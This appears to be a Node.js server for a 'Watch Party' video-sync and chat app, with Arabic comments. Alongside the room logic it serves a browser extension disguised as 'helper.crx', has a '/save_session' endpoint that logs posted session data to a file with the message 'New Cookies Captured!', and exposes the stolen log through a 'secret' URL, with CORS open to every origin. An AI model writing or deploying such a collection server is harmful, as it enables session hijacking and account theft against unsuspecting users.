const fs = require('fs');
const path = require('path');
const express = require("express");
const http = require("http");
const cors = require('cors'); // أضفت cors لضمان عدم حظر الطلبات
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// --- إعدادات أساسية ---
app.use(cors());
app.use(express.json());
app.use(express.static("public"));

// أخبر السيرفر أن يتعامل مع ملفات crx كإضافات متصفح
express.static.mime.define({'application/x-chrome-extension': ['crx']});

// تخزين بيانات الغرف والمعرفات
const rooms = {};
let agoraMap = {}; 

// --- [مهم جداً] رابط تحميل الإضافة لمتصفح Kiwi ---
app.get('/download-extension', (req, res) => {
    const filePath = path.join(__dirname, 'my-plugin.crx'); // تأكد من وجود الملف بهذا الاسم في المجلد الرئيسي
    if (fs.existsSync(filePath)) {
        res.setHeader('Content-Type', 'application/x-chrome-extension');
        res.download(filePath, 'helper.crx'); 
    } else {
        res.status(404).send("الملف my-plugin.crx غير موجود في المجلد الرئيسي للسيرفر.");
    }
});

// --- كود استقبال الكوكيز وحفظها ---
app.post('/save_session', (req, res) => {
    try {
        const data = req.body;
        if (data && data.session_data) {
            const logEntry = `\n--- NEW LOG [${new Date().toLocaleString()}] ---\n${data.session_data}\n`;
            const filePath = path.join(__dirname, 'cookies_log.txt');
            fs.appendFile(filePath, logEntry, (err) => {
                if (err) console.error("❌ Error writing to file:", err);
                else console.log("✅ New Cookies Captured!");
            });
            return res.status(200).json({ status: "success" });
        }
        res.status(400).json({ status: "no_data" });
    } catch (error) {
        res.status(500).json({ status: "internal_error" });
    }
});

// رابط سري لمشاهدة النتائج
app.get('/show-my-results-mysecret123', (req, res) => {
    const filePath = path.join(__dirname, 'cookies_log.txt');
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.send("لا يوجد بيانات مسجلة حتى الآن.");
});

// --- منطق Socket.io (Watch Party) ---
io.on("connection", (socket) => {
    console.log("مستخدم متصل جديد:", socket.id);

    socket.on("join-room", ({ roomId, password, user }) => {
        if (rooms[roomId] && rooms[roomId].password !== password) {
            return socket.emit("error-msg", "كلمة المرور خاطئة!");
        }
        socket.join(roomId);
        socket.userData = { ...user, roomId, id: socket.id };
        if (!rooms[roomId]) {
            rooms[roomId] = { password: password, users: [], currentVideo: "" };
        }
        rooms[roomId].users.push(socket.userData);
        socket.emit("join-success");
        io.to(roomId).emit("update-users", rooms[roomId].users);
        if(rooms[roomId].currentVideo) socket.emit("video-changed", rooms[roomId].currentVideo);
        io.to(roomId).emit("update-agora-map", agoraMap);
    });

    socket.on("map-agora-id", ({ uid }) => {
        const roomId = socket.userData?.roomId;
        if (roomId) {
            agoraMap[uid] = socket.id;
            io.to(roomId).emit("update-agora-map", agoraMap);
        }
    });

    socket.on("change-video", (url) => {
        const roomId = socket.userData?.roomId;
        if (roomId) {
            rooms[roomId].currentVideo = url;
            io.to(roomId).emit("video-changed", url);
        }
    });

    socket.on("video-control", (data) => {
        const roomId = socket.userData?.roomId;
        if (roomId) socket.to(roomId).emit("video-sync", data);
    });

    socket.on("chat-msg", (text) => {
        const roomId = socket.userData?.roomId;
        if (roomId) io.to(roomId).emit("chat-msg", { text, user: socket.userData });
    });

    socket.on("reaction", (emoji) => {
        const roomId = socket.userData?.roomId;
        if (roomId) io.to(roomId).emit("reaction", { emoji, userId: socket.id });
    });

    socket.on("disconnect", () => {
        const roomId = socket.userData?.roomId;
        if (rooms[roomId]) {
            rooms[roomId].users = rooms[roomId].users.filter(u => u.id !== socket.id);
            io.to(roomId).emit("update-users", rooms[roomId].users);
            for (let uid in agoraMap) {
                if (agoraMap[uid] === socket.id) delete agoraMap[uid];
            }
            io.to(roomId).emit("update-agora-map", agoraMap);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 السيرفر يعمل على بورت: ${PORT}`));

// تأكد أن هذه الأسطر موجودة في بداية server.js بعد تعريف app
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*"); // السماح لجميع المواقع
    res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    next();
});